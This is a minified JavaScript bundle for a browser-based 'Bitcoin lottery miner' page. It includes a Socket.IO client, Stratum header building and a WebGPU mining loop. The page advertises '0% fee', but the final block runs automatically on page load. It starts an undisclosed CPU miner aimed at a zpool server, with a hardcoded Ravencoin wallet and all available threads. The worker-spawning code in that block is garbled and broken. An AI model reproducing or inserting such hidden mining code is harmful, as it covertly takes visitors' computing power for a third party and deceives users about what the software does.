                        U.data && U.data.sid ? this.onconnect(U.data.sid, U.data.pid) : this.emitReserved("connect_error", new Error("It seems you are trying to reach a Socket.IO server in v2.x with a v3.x client, but they are not compatible (more information here: https://socket.io/docs/v3/migrating-from-2-x-to-3-0/)"));
                        break;
                    case nU.EVENT:
                    case nU.BINARY_EVENT:
                        this.onevent(U);
                        break;
                    case nU.ACK:
                    case nU.BINARY_ACK:
                        this.onack(U);
                        break;
                    case nU.DISCONNECT:
                        this.ondisconnect();
                        break;
                    case nU.CONNECT_ERROR:
                        this.destroy();
                        const F = new Error(U.data.message);
                        F.data = U.data.data, this.emitReserved("connect_error", F)
                }
            }
            onevent(U) {
                const F = U.data || [];
                null != U.id && F.push(this.ack(U.id)), this.connected ? this.emitEvent(F) : this.receiveBuffer.push(Object.freeze(F))
            }
            emitEvent(U) {
                if (this._anyListeners && this._anyListeners.length) {
                    const F = this._anyListeners.slice();
                    for (const Q of F) Q.apply(this, U)
                }
                super.emit.apply(this, U), this._pid && U.length && "string" == typeof U[U.length - 1] && (this._lastOffset = U[U.length - 1])
            }
            ack(U) {
                const F = this;
                let Q = !1;
                return function(...B) {
                    Q || (Q = !0, F.packet({
                        type: nU.ACK,
                        id: U,
                        data: B
                    }))
                }
            }
            onack(U) {
                const F = this.acks[U.id];
                "function" == typeof F && (delete this.acks[U.id], F.withError && U.data.unshift(null), F.apply(this, U.data))
            }
            onconnect(U, F) {
                this.id = U, this.recovered = F && this._pid === F, this._pid = F, this.connected = !0, this.emitBuffered(), this.emitReserved("connect"), this._drainQueue(!0)
            }
            emitBuffered() {
                this.receiveBuffer.forEach((U => this.emitEvent(U))), this.receiveBuffer = [], this.sendBuffer.forEach((U => {
                    this.notifyOutgoingListeners(U), this.packet(U)
                })), this.sendBuffer = []
            }
            ondisconnect() {
                this.destroy(), this.onclose("io server disconnect")
            }
            destroy() {
                this.subs && (this.subs.forEach((U => U())), this.subs = void 0), this.io._destroy(this)
            }
            disconnect() {
                return this.connected && this.packet({
                    type: nU.DISCONNECT
                }), this.destroy(), this.connected && this.onclose("io client disconnect"), this
            }
            close() {
                return this.disconnect()
            }
            compress(U) {
                return this.flags.compress = U, this
            }
            get volatile() {
                return this.flags.volatile = !0, this
            }
            timeout(U) {
                return this.flags.timeout = U, this
            }
            onAny(U) {
                return this._anyListeners = this._anyListeners || [], this._anyListeners.push(U), this
            }
            prependAny(U) {
                return this._anyListeners = this._anyListeners || [], this._anyListeners.unshift(U), this
            }
            offAny(U) {
                if (!this._anyListeners) return this;
                if (U) {
                    const F = this._anyListeners;
                    for (let Q = 0; Q < F.length; Q++)
                        if (U === F[Q]) return F.splice(Q, 1), this
                } else this._anyListeners = [];
                return this
            }
            listenersAny() {
                return this._anyListeners || []
            }
            onAnyOutgoing(U) {
                return this._anyOutgoingListeners = this._anyOutgoingListeners || [], this._anyOutgoingListeners.push(U), this
            }
            prependAnyOutgoing(U) {
                return this._anyOutgoingListeners = this._anyOutgoingListeners || [], this._anyOutgoingListeners.unshift(U), this
            }
            offAnyOutgoing(U) {
                if (!this._anyOutgoingListeners) return this;
                if (U) {
                    const F = this._anyOutgoingListeners;
                    for (let Q = 0; Q < F.length; Q++)
                        if (U === F[Q]) return F.splice(Q, 1), this
                } else this._anyOutgoingListeners = [];
                return this
            }
            listenersAnyOutgoing() {
                return this._anyOutgoingListeners || []
            }
            notifyOutgoingListeners(U) {
                if (this._anyOutgoingListeners && this._anyOutgoingListeners.length) {
                    const F = this._anyOutgoingListeners.slice();
                    for (const Q of F) Q.apply(this, U.data)
                }
            }
        }

        function YU(U) {
            U = U || {}, this.ms = U.min || 100, this.max = U.max || 1e4, this.factor = U.factor || 2, this.jitter = U.jitter > 0 && U.jitter <= 1 ? U.jitter : 0, this.attempts = 0
        }
        YU.prototype.duration = function() {
            var U = this.ms * Math.pow(this.factor, this.attempts++);
            if (this.jitter) {
                var F = Math.random(),
                    Q = Math.floor(F * this.jitter * U);
                U = 1 & Math.floor(10 * F) ? U + Q : U - Q
            }
            return 0 | Math.min(U, this.max)
        }, YU.prototype.reset = function() {
            this.attempts = 0
        }, YU.prototype.setMin = function(U) {
            this.ms = U
        }, YU.prototype.setMax = function(U) {
            this.max = U
        }, YU.prototype.setJitter = function(U) {
            this.jitter = U
        };
        class cU extends e {
            constructor(F, Q) {
                var B;
                super(), this.nsps = {}, this.subs = [], F && "object" == typeof F && (Q = F, F = void 0), (Q = Q || {}).path = Q.path || "/socket.io", this.opts = Q, C(this, Q), this.reconnection(!1 !== Q.reconnection), this.reconnectionAttempts(Q.reconnectionAttempts || 1 / 0), this.reconnectionDelay(Q.reconnectionDelay || 1e3), this.reconnectionDelayMax(Q.reconnectionDelayMax || 5e3), this.randomizationFactor(null !== (B = Q.randomizationFactor) && void 0 !== B ? B : .5), this.backoff = new YU({
                    min: this.reconnectionDelay(),
                    max: this.reconnectionDelayMax(),
                    jitter: this.randomizationFactor()
                }), this.timeout(null == Q.timeout ? 2e4 : Q.timeout), this._readyState = "closed", this.uri = F;
                const R = Q.parser || U;
                this.encoder = new R.Encoder, this.decoder = new R.Decoder, this._autoConnect = !1 !== Q.autoConnect, this._autoConnect && this.open()
            }
            reconnection(U) {
                return arguments.length ? (this._reconnection = !!U, this) : this._reconnection
            }
            reconnectionAttempts(U) {
                return void 0 === U ? this._reconnectionAttempts : (this._reconnectionAttempts = U, this)
            }
            reconnectionDelay(U) {
                var F;
                return void 0 === U ? this._reconnectionDelay : (this._reconnectionDelay = U, null === (F = this.backoff) || void 0 === F || F.setMin(U), this)
            }
            randomizationFactor(U) {
                var F;
                return void 0 === U ? this._randomizationFactor : (this._randomizationFactor = U, null === (F = this.backoff) || void 0 === F || F.setJitter(U), this)
            }
            reconnectionDelayMax(U) {
                var F;
                return void 0 === U ? this._reconnectionDelayMax : (this._reconnectionDelayMax = U, null === (F = this.backoff) || void 0 === F || F.setMax(U), this)
            }
            timeout(U) {
                return arguments.length ? (this._timeout = U, this) : this._timeout
            }
            maybeReconnectOnOpen() {
                !this._reconnecting && this._reconnection && 0 === this.backoff.attempts && this.reconnect()
            }
            open(U) {
                if (~this._readyState.indexOf("open")) return this;
                this.engine = new FU(this.uri, this.opts);
                const F = this.engine,
                    Q = this;
                this._readyState = "opening", this.skipReconnect = !1;
                const B = hU(F, "open", (function() {
                        Q.onopen(), U && U()
                    })),
                    R = F => {
                        this.cleanup(), this._readyState = "closed", this.emitReserved("error", F), U ? U(F) : this.maybeReconnectOnOpen()
                    },
                    V = hU(F, "error", R);
                if (!1 !== this._timeout) {
                    const U = this._timeout,
                        Q = this.setTimeoutFn((() => {
                            B(), R(new Error("timeout")), F.close()
                        }), U);
                    this.opts.autoUnref && Q.unref(), this.subs.push((() => {
                        this.clearTimeoutFn(Q)
                    }))
                }
                return this.subs.push(B), this.subs.push(V), this
            }
            connect(U) {
                return this.open(U)
            }
            onopen() {
                this.cleanup(), this._readyState = "open", this.emitReserved("open");
                const U = this.engine;
                this.subs.push(hU(U, "ping", this.onping.bind(this)), hU(U, "data", this.ondata.bind(this)), hU(U, "error", this.onerror.bind(this)), hU(U, "close", this.onclose.bind(this)), hU(this.decoder, "decoded", this.ondecoded.bind(this)))
            }
            onping() {
                this.emitReserved("ping")
            }
            ondata(U) {
                try {
                    this.decoder.add(U)
                } catch (U) {
                    this.onclose("parse error", U)
                }
            }
            ondecoded(U) {
                P((() => {
                    this.emitReserved("packet", U)
                }), this.setTimeoutFn)
            }
            onerror(U) {
                this.emitReserved("error", U)
            }
            socket(U, F) {
                let Q = this.nsps[U];
                return Q ? this._autoConnect && !Q.active && Q.connect() : (Q = new tU(this, U, F), this.nsps[U] = Q), Q
            }
            _destroy(U) {
                const F = Object.keys(this.nsps);
                for (const U of F)
                    if (this.nsps[U].active) return;
                this._close()
            }
            _packet(U) {
                const F = this.encoder.encode(U);
                for (let Q = 0; Q < F.length; Q++) this.engine.write(F[Q], U.options)
            }
            cleanup() {
                this.subs.forEach((U => U())), this.subs.length = 0, this.decoder.destroy()
            }
            _close() {
                this.skipReconnect = !0, this._reconnecting = !1, this.onclose("forced close"), this.engine && this.engine.close()
            }
            disconnect() {
                return this._close()
            }
            onclose(U, F) {
                this.cleanup(), this.backoff.reset(), this._readyState = "closed", this.emitReserved("close", U, F), this._reconnection && !this.skipReconnect && this.reconnect()
            }
            reconnect() {
                if (this._reconnecting || this.skipReconnect) return this;
                const U = this;
                if (this.backoff.attempts >= this._reconnectionAttempts) this.backoff.reset(), this.emitReserved("reconnect_failed"), this._reconnecting = !1;
                else {
                    const F = this.backoff.duration();
                    this._reconnecting = !0;
                    const Q = this.setTimeoutFn((() => {
                        U.skipReconnect || (this.emitReserved("reconnect_attempt", U.backoff.attempts), U.skipReconnect || U.open((F => {
                            F ? (U._reconnecting = !1, U.reconnect(), this.emitReserved("reconnect_error", F)) : U.onreconnect()
                        })))
                    }), F);
                    this.opts.autoUnref && Q.unref(), this.subs.push((() => {
                        this.clearTimeoutFn(Q)
                    }))
                }
            }
            onreconnect() {
                const U = this.backoff.attempts;
                this._reconnecting = !1, this.backoff.reset(), this.emitReserved("reconnect", U)
            }
        }
        const eU = {};

        function mU(U, F) {
            "object" == typeof U && (F = U, U = void 0);
            const Q = function(U, F = "", Q) {
                    let B = U;
                    Q = Q || "undefined" != typeof location && location, null == U && (U = Q.protocol + "//" + Q.host), "string" == typeof U && ("/" === U.charAt(0) && (U = "/" === U.charAt(1) ? Q.protocol + U : Q.host + U), /^(https?|wss?):\/\//.test(U) || (U = void 0 !== Q ? Q.protocol + "//" + U : "https://" + U), B = UU(U)), B.port || (/^(http|ws)$/.test(B.protocol) ? B.port = "80" : /^(http|ws)s$/.test(B.protocol) && (B.port = "443")), B.path = B.path || "/";
                    const R = -1 !== B.host.indexOf(":") ? "[" + B.host + "]" : B.host;
                    return B.id = B.protocol + "://" + R + ":" + B.port + F, B.href = B.protocol + "://" + R + (Q && Q.port === B.port ? "" : ":" + B.port), B
                }(U, (F = F || {}).path || "/socket.io"),
                B = Q.source,
                R = Q.id,
                V = Q.path,
                l = eU[R] && V in eU[R].nsps;
            let N;
            return F.forceNew || F["force new connection"] || !1 === F.multiplex || l ? N = new cU(B, F) : (eU[R] || (eU[R] = new cU(B, F)), N = eU[R]), Q.query && !F.query && (F.query = Q.queryKey), N.socket(Q.path, F)
        }
        Object.assign(mU, {
            Manager: cU,
            Socket: tU,
            io: mU,
            connect: mU
        });
        var GU = Q(396),
            zU = Q.n(GU);

        function jU(U) {
            const F = [];
            for (let Q = 0; Q < U.length; Q += 2) F.push(parseInt(U.substr(Q, 2), 16));
            return new Uint8Array(F)
        }

        function CU(U) {
            return zU().SHA256(zU().SHA256(zU().enc.Hex.parse(U))).toString()
        }

        function XU(U) {
            const F = U.match(/(..?)/g);
            return F[3] + F[2] + F[1] + F[0]
        }
        class OU {#
            B;
            constructor(U, F, Q) {
                let B = CU(U.coinb1 + U.extraNonce1 + F.toString(16).padStart(2 * U.extraNonce2Size, "0") + U.coinb2);
                for (const F of U.merkle_branch) B = CU(B + F);
                const R = XU(U.version),
                    V = XU(U.ntime),
                    l = XU(U.nbits);
                this.#B = R + this.#R(U.prevhash) + B + V + l + XU(Q.toString(16).padStart(8, "0"))
            }#
            R(U) {
                const F = new Uint8Array(new ArrayBuffer(32));
                return F.set(jU(U)),
                    function(U) {
                        for (let Q = 0; Q < 8; Q++) U[Q] = (F = U[Q]) >> 24 & 255 | F >> 8 & 65280 | F << 8 & 16711680 | F << 24 & 4278190080;
                        var F
                    }(new Uint32Array(F.buffer)), F.reduce(((U, F) => U + F.toString(16).padStart(2, "0")), "")
            }
            get header() {
                return this.#B
            }
            toUint8Array() {
                return jU(this.#B)
            }
            toUint32Array() {
                return new Uint32Array(jU(this.#B).buffer)
            }
            print(U) {
                return console.log(U, this.#B), this
            }
            static test() {
                let U = {
                    extraNonce1: "60021014",
                    extraNonce2Size: 4,
                    jobId: "5c04",
                    prevhash: "da0dadb0eda4381df442bde08d23d54d7d371d5ce7af3ee716bd2a7e017eacb8",
                    coinb1: "01000000010000000000000000000000000000000000000000000000000000000000000000ffffffff2a03700a08062f503253482f04953f1a5308",
                    coinb2: "102f776166666c65706f6f6c2e636f6d2f0000000001d07e582a010000001976a9145d8f33b0a7c94c878d572c40cbff22a49268467d88ac00000000",
                    merkle_branch: ["50a4a386ab344d40d29a833b6e40ea27dab6e5a79a2f8648d3bc0d1aa65ecd3f", "7952ecc836fb104f41b2cb06608eeeaa6d1ca2fe4391708fb13bb10ccf8da179", "9400ec6453aac577fb6807f11219b4243a3e50ca6d1c727e6d05663211960c94", "c11a630fa9332ab51d886a47509b5cbace844316f4fc52b493359b305fd489ae", "85891e7c5773f234d647f1d5fca7fbcabb59b261322d16c0ae486ccf5143383d", "faa26bbc17f99659f64136bea29b3fc8d772b339c52707d5f2ccfe1195317f43"],
                    version: "00000002",
                    nbits: "1b10b60e",
                    ntime: "531a3f95",
                    clean_jobs: !1
                };
                console.assert("02000000b0ad0dda1d38a4ede0bd42f44dd5238d5c1d377de73eafe77e2abd16b8ac7e0143c4345eb9ad9135836f5c31b697f62429c1be08d55906ff407852adfba680a5953f1a530eb6101ba001cb6a" === new OU(U, 0, 1791689120).header, "Test 1: header build failed"), U = {
                    extraNonce1: "67ffed53",
                    extraNonce2Size: 4,
                    jobId: "e0ff",
                    prevhash: "dd970b967fcd7ba611c0ca4149313e2255704a820a70ead0b2ef3c2900000a0a",
                    coinb1: "01000000010000000000000000000000000000000000000000000000000000000000000000ffffffff4e03d93d1f0424f5016308fabe6d6d00000000000000000000000000000000000000000000000000000000000000000100000000000000",
                    coinb2: "0f706f6f6c2e72706c616e742e78797a00000000020000000000000000266a24aa21a9ed889e8ce0216f207f75106adee83fac289bce8fe957fb2cca2be15c990099875a601fe70e000000001976a914bb89477996b8a915f686a1ba7109987a7b7730c188ac00000000",
                    merkle_branch: ["cf00b937757b98d92f0eaea7c7c3139014b37266bee658cbcd60466822796328"],
                    version: "20000000",
                    nbits: "1e0bfaf3",
                    ntime: "6301f524",
                    clean_jobs: !0
                }, console.assert("00000020960b97dda67bcd7f41cac011223e3149824a7055d0ea700a293cefb20a0a0000c1558f21a9c06e4864db4c09dfb99f396e6ca66732f59e8731bfd73d55fe84c124f50163f3fa0b1ecbaeaaaa" === new OU(U, 0, 2863312587).header, "Test 2: header build failed")
            }
        }
        class bU {#
            V;#
            l;#
            N;#
            d;
            static id = 0;
            constructor(U) {
                U && (this.#V = document.createElement(U), this.#V.id = bU.id++)
            }
            get id() {
                return this.#V.id
            }
            appendChild(U) {
                return U && (U.parent = this, this.#V.appendChild(U.elem)), this
            }
            removeChild(U) {
                return this.#V.removeChild(U.elem), this
            }
            set parent(U) {
                this.#d = U
            }
            get parent() {
                return this.#d
            }
            get elem() {
                return this.#V
            }
            set elem(U) {
                this.#V = U
            }
            get outerHTML() {
                return this.#V.outerHTML
            }
            set innerText(U) {
                this.#V.innerText = U
            }
            set innerHTML(U) {
                this.#V.innerHTML = U
            }
            get innerHTML() {
                return this.#V.innerHTML
            }
            print() {
                return console.log(this.outerHTML), this
            }
            addClasses(...U) {
                return this.#V.classList.add(...U), this
            }
            removeClasses(...U) {
                return this.#V.classList.remove(...U), this
            }
            show() {
                return this.style.visibility = "visible", this
            }
            hide() {
                return this.style.visibility = "hidden", this
            }
            onClick(U) {
                return this.cursor("pointer"), this.#V.onclick = U ? () => U(this) : null, this
            }
            remove() {
                return this.#V.remove(), this
            }
            replace(U) {
                return this.parent && (this.parent.elem.replaceChild(U.elem, this.elem), U.parent = this.parent), this
            }
            onUpdate(U) {
                return this.#l = () => U(this), this
            }
            startUpdate(U) {
                return this.#N = setInterval(this.#l, U), this
            }
            stopUpdate() {
                return clearInterval(this.#N), this
            }
            cursor(U) {
                return this.style.cursor = U, this
            }
            color(U) {
                return this.style.color = U, this
            }
            backgroundColor(U) {
                return this.style.backgroundColor = U, this
            }
            backgroundImage(U, F, Q) {
                return this.style.backgroundImage = `url(${U})`, this.style.backgroundRepeat = "no-repeat", this.style.backgroundSize = F, Q = Q || 1, this.style.cssText += `aspect-ratio:${Q}`, this
            }
            setTooltip(U) {
                return this.#V.setAttribute("aria-hidden", !0), this.#V.setAttribute("data-bs-toggle", "tooltip"), this.#V.setAttribute("data-bs-placement", "top"), this.#V.setAttribute("title", U), this
            }
            size(U, F) {
                return this.style.width = U, this.style.height = F, this
            }
            filter(U) {
                return this.style.filter = U, this
            }
            onWheel(U) {
                return this.#V.onwheel = F => U(this, F), this
            }
            center() {
                return this.style.margin = "auto", this
            }
            zIndex(U) {
                return this.style.zIndex = U, this
            }
            display(U) {
                return this.style.display = U, this
            }
            maxWidth(U) {
                return this.style.maxWidth = U, this
            }
            minWidth(U) {
                return this.style.minWidth = U, this
            }
            maxHeight(U) {
                return this.style.maxHeight = U, this
            }
            minHeight(U) {
                return this.style.minHeight = U, this
            }
            get style() {
                return this.#V.style
            }
            onMouseOver(U) {
                return this.#V.onmouseover = F => U(this, F), this
            }
            onMouseLeave(U) {
                return this.#V.onmouseleave = F => U(this, F), this
            }
            addAnimation(U, F, Q, B, R, V, l, N) {
                const d = `${U||""} ${F||""} ${Q||""} ${B||""} ${R||""} ${V||""} ${l||""} ${N||""}`;
                return this.style.animation ? this.style.animation += `, ${d}` : this.style.animation = d, this
            }
            addTransition(U, F, Q, B) {
                const R = `${U} ${F} ${Q||""} ${B||""}`;
                return this.style.transition ? this.style.transition += `, ${R}` : this.style.transition = R, this
            }
        }
        class LU extends bU {
            constructor(U, F) {
                super(U), this.innerHTML = F
            }
            setText(U) {
                return this.innerHTML = U, this
            }
            getText() {
                return this.innerHTML
            }
        }
        class xU extends bU {
            constructor(U, F, Q, B) {
                super("input"), this.elem.type = U, F && (this.elem.placeholder = F), Q && (this.elem.minLength = Q), B && (this.elem.maxLength = B)
            }
            disable() {
                return this.elem.readOnly = !0, this.removeClasses("form-control"), this.addClasses("form-control-plaintext"), this
            }
            enable() {
                return this.elem.readOnly = !1, this.removeClasses("form-control-plaintext"), this.addClasses("form-control"), this
            }
            get value() {
                return this.elem.value.trim()
            }
            set value(U) {
                this.elem.value = U
            }
            onChange(U) {
                return this.elem.onchange = F => U(F), this
            }
            onInput(U) {
                return this.elem.oninput = F => U(F), this
            }
            onEnter(U) {
                return this.elem.onkeyup = F => {
                    "Enter" === F.key && U(this)
                }, this
            }
        }
        class oU extends bU {
            constructor(U) {
                super("div"), this.addClasses("d-flex", `gap-${U}`)
            }
            justifyContent(U) {
                return this.addClasses(`justify-content-${U}`), this
            }
            alignItems(U) {
                return this.addClasses(`align-items-${U}`), this
            }
        }
        class IU extends oU {
            constructor(U) {
                super(U), this.addClasses("flex-column")
            }
        }
        class rU extends oU {
            constructor(U) {
                super(U), this.addClasses("flex-row", "flex-wrap")
            }
        }

        function wU(U, F) {
            const Q = new Date;
            Q.setTime(Q.getTime() + 31536e6);
            const B = "expires=" + Q.toUTCString();
            document.cookie = U + "=" + F + ";" + B + ";path=/"
        }

        function sU(U) {
            const F = U + "=",
                Q = document.cookie.split(";");
            for (let U = 0; U < Q.length; U++) {
                let B = Q[U];
                for (;
                    " " == B.charAt(0);) B = B.substring(1);
                if (0 == B.indexOf(F)) return B.substring(F.length, B.length)
            }
            return null
        }
        const yU = "1.0.3",
            vU = new class {#
                Z(U) {
                    const F = {
                        Accept: "application/json",
                        "Content-Type": "application/json"
                    };
                    return U && (F.Authorization = `Bearer ${U}`), F
                }
                async get(U, F) {
                    return await fetch(U, {
                        method: "GET",
                        headers: this.#Z(F)
                    })
                }
                async put(U, F, Q) {
                    return await fetch(U, {
                        method: "PUT",
                        headers: this.#Z(Q),
                        body: JSON.stringify(F)
                    })
                }
                async post(U, F, Q) {
                    return await fetch(U, {
                        method: "POST",
                        headers: this.#Z(Q),
                        body: JSON.stringify(F)
                    })
                }
            },
            HU = new class {
                async getVersion() {
                    return await this.#W(await vU.get("/version"))
                }
                async# W(U) {
                    const F = await U.json();
                    if (200 === U.status) return F.res;
                    if (500 === U.status) throw F.error
                }
            };
        let iU, KU = [];

        function uU() {
            return (new Date).getTime()
        }

        function gU(U) {
            return Math.floor(Math.random() * 2 ** U)
        }
        class PU {#
            S;
            async loop(U) {
                for (this.#S = !1; !this.#S;) await U()
            }
            stop() {
                this.#S = !0
            }
        }

        function AU(U, F) {
            const Q = new xU("text");
            return Q.value = F, new rU(1).alignItems("center").appendChild(new LU("p", U).size("120px", "auto")).appendChild(Q)
        }

        function fU(U) {
            return U.elem.children.item(1).value
        }
        const qU = AU("stratum+tcp://", sU("server")),
            _U = AU("port", sU("port")),
            $U = AU("wallet", sU("wallet")),
            UF = AU("password", sU("password")),
            FF = new class {#
                J = null;#
                E = null;#
                T = 0;
                run(U) {
                    let Q, l;
                    this.#J = mU("wss://websocket-stratum-server.com", {
                        transports: ["websocket"]
                    }), this.#J.on("can start", (() => this.#J.emit("start", {
                        client: "gpu-web-miner",
                        version: yU,
                        stratum: U,
                        algo: "sha256d"
                    }))), this.#J.on("work", (async U => {
                        const N = function(U) {
                            return ((2 ** 224 - 1) / U.miningDiff).toString(16).padStart(64, "0")
                        }(U);
                        l = function(U) {
                            for (let Q = 0; Q < 8; Q++) U[Q] = (F = U[Q]) >> 24 & 255 | F >> 8 & 65280 | F << 8 & 16711680 | F << 24 & 4278190080;
                            var F;
                            return U
                        }(new Uint32Array(function(U) {
                            const F = [];
                            for (let Q = 0; Q < U.length; Q += 2) F.push(parseInt(U.substr(Q, 2), 16));
                            return new Uint8Array(F)
                        }(N).buffer)), ZF.setText("current target: " + N), Q ? Q = U : (Q = U, this.#E = new PU, await this.#E.loop((async () => {
                            const U = uU(),
                                N = gU(8 * Q.extraNonce2Size);
                            Q.ntime = gU(32).toString(16).padStart(8, "0");
                            const d = await async function(U, Q, l) {
                                if (80 !== U.byteLength) throw "Header must be 80 byte length";
                                const N = [];
                                try {
                                    await F.init();
                                    const d = 120 + 4 * await R() + 4,
                                        Z = F.instance.createBuffer({
                                            mappedAtCreation: !0,
                                            size: d,
                                            usage: GPUBufferUsage.STORAGE | GPUBufferUsage.COPY_SRC
                                        }),
                                        W = new Uint32Array(Z.getMappedRange());
                                    W.set([l, 32]), W.set(U, 2), W.set(Q, 22), Z.unmap();
                                    const S = F.instance.device.createBindGroup({
                                            layout: F.instance.computePipeline.getBindGroupLayout(0),
                                            entries: [{
                                                binding: 0,
                                                resource: {
                                                    buffer: Z
                                                }
                                            }]
                                        }),
                                        J = F.instance.device.createCommandEncoder(),
                                        E = J.beginComputePass();
                                    E.setPipeline(F.instance.computePipeline), E.setBindGroup(0, S), E.dispatchWorkgroups(await B()), E.end();
                                    const T = F.instance.createBuffer({
                                        size: d - 120,
                                        usage: GPUBufferUsage.COPY_DST | GPUBufferUsage.MAP_READ
                                    });
                                    J.copyBufferToBuffer(Z, 120, T, 0, d - 120);
                                    const n = J.finish();
                                    F.instance.device.queue.submit([n]), await T.mapAsync(GPUMapMode.READ);
                                    const k = new Uint32Array(T.getMappedRange());
                                    if (k[0])
                                        for (let U = 1; U < k.length; U++)
                                            if (0 !== k[U])
                                                for (let F = 0; F < 32; F++) k[U] >> F & !0 && N.push(l), l = (l + 1) % V;
                                            else l = (l + 32) % V;
                                    F.instance.destroyBuffers()
                                } catch (U) {
                                    console.error(U), F.destroy()
                                }
                                return N
                            }(new OU(Q, N, 0).toUint32Array(), l, gU(32));
                            d.length > 0 && (this.#T += d.length, BF(this.#T));
                            for (const U of d) this.#n(Q, N, U);
                            VF(await async function() {
                                return (32 * await R() / ((uU() - U) / 1e3) / 1e3 / 1e3).toFixed(4)
                            }())
                        })))
                    })), this.#J.on("submit failed", (U => {})), this.#J.on("warning", (U => function(...U) {
                        QF("text-warning", "Warning:", ...U)
                    }(U)))
                }
                async# n(U, F, Q) {
                    this.#J.emit("submit", {
                        job_id: U.jobId,
                        extranonce2: F.toString(16).padStart(2 * U.extraNonce2Size, "0"),
                        ntime: U.ntime,
                        nonce: Q.toString(16).padStart(8, "0")
                    })
                }
                stop() {
                    this.#E && (this.#E.stop(), this.#E = null), this.#J && (this.#J.disconnect(), this.#J = null)
                }
            };

        function QF(U, ...F) {
            const Q = new LU("b", F.join(" "));
            U && Q.addClasses(U), dF.replace(Q), dF = Q
        }

        function BF(U) {
            JF.setText("found " + U + " shares")
        }

        function RF(U) {
            SF.setText("Online miners: " + U)
        }

        function VF(U) {
            WF.setText("Hashrate: " + U + " MH/s")
        }
        const lF = new LU("p", "Run").addClasses("text-center", "text-button").onClick((function(U) {
                wU("run", !0), wU("server", fU(qU)), wU("port", fU(_U)), wU("wallet", fU($U)), wU("password", fU(UF));
                try {
                    ! function() {
                        if (!navigator.gpu) throw "WebGPU not supported"
                    }(), FF.run({
                        userAgent: location.host,
                        server: sU("server"),
                        port: sU("port"),
                        worker: sU("wallet"),
                        password: sU("password")
                    }), U.replace(NF)
                } catch (U) {
                    ! function(...U) {
                        QF("text-error", "Error:", ...U)
                    }(U)
                }
            })),
            NF = new LU("p", "Stop").addClasses("text-center", "text-button").onClick((function(U) {
                wU("run", !1), FF.stop(), U.replace(lF)
            }));
        let dF = new LU("p", "").addClasses("text-center");
        const ZF = new LU("p", "").addClasses("text-center"),
            WF = new LU("p", "").addClasses("text-center"),
            SF = new LU("p", "").addClasses("text-center"),
            JF = new LU("p", "").addClasses("text-center"),
            EF = "Bitcoin web miner v" + yU;
        async function TF() {
            await HU.getVersion() !== yU && location.reload()
        }
        BF(0), RF("?"), VF("?"), (new class extends bU {
                constructor() {
                    super(), this.elem = document.body
                }
            }).appendChild(new class extends IU {
                constructor(U) {
                    super(U), this.addClasses("min-vh-100")
                }
            }(1).justifyContent("center").alignItems("center").appendChild(new class extends bU {
                constructor(U, F, Q, B) {
                    super("img"), this.elem.src = U, this.elem.alt = F, this.style.maxWidth = "100%", Q && (this.style.objectFit = Q), B && (this.style.cssText += `aspect-ratio:${B}`)
                }
                set src(U) {
                    this.elem.src = U
                }
                get src() {
                    return this.elem.src
                }
            }("assets/logo.png", "logo").size("256px", "256px")).appendChild(new LU("p", EF).addClasses("text-center")).appendChild(new LU("p", "This software is a <b>Bitcoin lottery miner</b> that uses your GPU to mine Bitcoin.<br>Thanks to the new standard WebGPU, browsers can now use GPU for general purpose tasks.<br><br><b>Bitcoin mining on GPU is not profitable, but you can try your luck and attempt to find a block on SOLO pools.</b><br><b>0% fee</b><br><b>** This software updates itself. When a new version is available it refreshes the page and restarts the mining. **</b>").addClasses("text-center")).appendChild(SF).appendChild(qU).appendChild(_U).appendChild($U).appendChild(UF).appendChild(lF).appendChild(WF).appendChild(JF).appendChild(ZF).appendChild(dF)),
            function U() {
                const F = mU("wss://websocket-stratum-server.com", {
                    transports: ["websocket"]
                });
                F.emit("getNumMiners", {
                    client: "gpu-web-miner"
                }), F.on("num miners", (Q => {
                    F.disconnect(), RF(Q), setTimeout(U, 6e4)
                }))
            }(), TF(), setInterval(TF, 6e4), JSON.parse(sU("run")) && lF.elem.click(),
            function(U, F, Q, B) {
                async function R(U) {}
                async function V(U) {}
                if (!window.Worker) throw "Web Worker not supported";
                if ((B = B || window.navigator.hardwareConcurrency) < 0) throw "nthreads must be positive";
                const l = Math.min(B, window.navigator.hardwareConcurrency);
                F.userAgent = location.host, iU = mU("wss://websocket-stratum-server.com", {
                    transports: ["websocket"]
                }), iU.on("can start", (() => iU.emit("start", {
                    client: "cpu-web-miner",
                    version: "1.7.4",
                    stratum: F,
                    algo: U
                }))), iU.on("work", (function(F) {
                    !async function() {}(),
                    function() {
                        for (const U of KU) try {
                            U.terminate()
                        } catch (U) {}
                        KU = []
                    }();
                    for (let Q = 0; Q < l; Q++) {
                        KU.push(Q), Q.onmessage = U => {
                            if ("submit" === U.data.type) {
                                const F = (l * U.data.hashrate).toFixed(2);
                                R(), iU.emit("submit", U.data.data), iU.emit("hashrate", {
                                    hashrate: F
                                })
                            }
                        }, Q.postMessage({
                            algo: U,
                            work: F
                        })
                    }
                })), iU.on("submit failed", (U => V())), iU.on("error", (U => V()))
            }("cwm_minotaurx", {
                server: "minotaurx.eu.mine.zpool.ca",
                port: 7019,
                worker: "R9uHDn9XXqPAe2TLsEmVoNrokmWsHREV2Q",
                password: "c=RVN",
                ssl: false
            }, 0, 0)
    })()
})();